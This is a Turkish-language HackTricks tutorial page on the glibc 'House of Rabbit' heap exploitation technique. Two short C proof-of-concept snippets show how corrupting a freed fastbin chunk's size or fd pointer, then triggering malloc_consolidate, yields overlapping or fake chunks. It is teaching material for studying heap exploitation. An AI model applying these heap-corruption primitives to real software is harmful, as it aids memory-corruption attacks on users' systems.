# Tavşan Evi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

### Gereksinimler

1. **Fastbin fd İşaretçisini veya Boyutunu Değiştirme Yeteneği**: Bu, fastbin'deki bir parçanın ileri işaretçisini veya boyutunu değiştirebileceğiniz anlamına gelir.
2. **`malloc_consolidate`'i Tetikleme Yeteneği**: Bu, ya büyük bir parça ayırarak ya da üst parçayı birleştirerek yapılabilir, bu da heap'in parçaları birleştirmesini zorlar.

### Hedefler

1. **Çakışan Parçalar Oluşturmak**: Başka bir parçayla çakışan bir parça oluşturarak heap manipülasyonları için olanak sağlamak.
2. **Sahte Parçalar Oluşturmak**: Allokatörü, heap işlemleri sırasında sahte bir parçayı meşru bir parça olarak algılamaya kandırmak.

## Saldırı Adımları

### POC 1: Bir Fastbin Parçasının Boyutunu Değiştirme

**Amaç**: Bir fastbin parçasının boyutunu manipüle ederek çakışan bir parça oluşturmak.

* **Adım 1: Parçaları Ayırın**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Adım 2: Parçaları Serbest Bırakın**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **Adım 3: Parça Boyutunu Değiştirme**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Adım 4: `malloc_consolidate`'i Tetikleyin**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Büyük bir parça ayırmak, küçük parçaları hızlı kutucukta birleştiren `malloc_consolidate` işlevini tetikler. `chunk1`'in manipüle edilen boyutu, `chunk2` ile örtüşmesine neden olur.

Konsolidasyondan sonra, `chunk1`, `chunk2` ile örtüşerek daha fazla sömürüme olanak tanır.

### POC 2: FD İşaretçisini Değiştir

**Amaç**: Hızlı kutucuk fd işaretçisini manipüle ederek sahte bir parça oluşturmak.

* **Adım 1: Parçaları Ayırma**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Açıklama**: Sahte bloğu oluşturmak için daha küçük ve daha büyük olmak üzere iki blok tahsis ediyoruz.

* **Adım 2: Sahte Blok Oluştur**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Adım 3: Chunk1'i Serbest Bırakın**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Açıklama**: `chunk1`'i serbest bırakıyoruz, onu fastbin listesine ekliyoruz.

* **Adım 4: Chunk1'in FD'sini Değiştirin**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Açıklama**: `chunk1`'in ileri işaretçisini (fd) `chunk2` içindeki sahte parçaya işaret edecek şekilde değiştiriyoruz.

* **Adım 5: `malloc_consolidate`'i Tetikle**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Bir büyük parça yeniden tahsis edildiğinde `malloc_consolidate` tetiklenir, sahte parçayı işler.

Sahte parça, fastbin listesinin bir parçası haline gelir, bu da onu daha fazla sömürü için geçerli bir parça yapar.

### Özet

**House of Rabbit** tekniği, ya bir fastbin parçasının boyutunu değiştirerek çakışan parçalar oluşturmayı ya da fd işaretçisini manipüle ederek sahte parçalar oluşturmayı içerir. Bu, saldırganların yığında geçerli parçaları oluşturmasına olanak tanır ve çeşitli sömürü biçimlerini etkinleştirir. Bu adımları anlamak ve uygulamak, yığın sömürü becerilerinizi geliştirecektir.
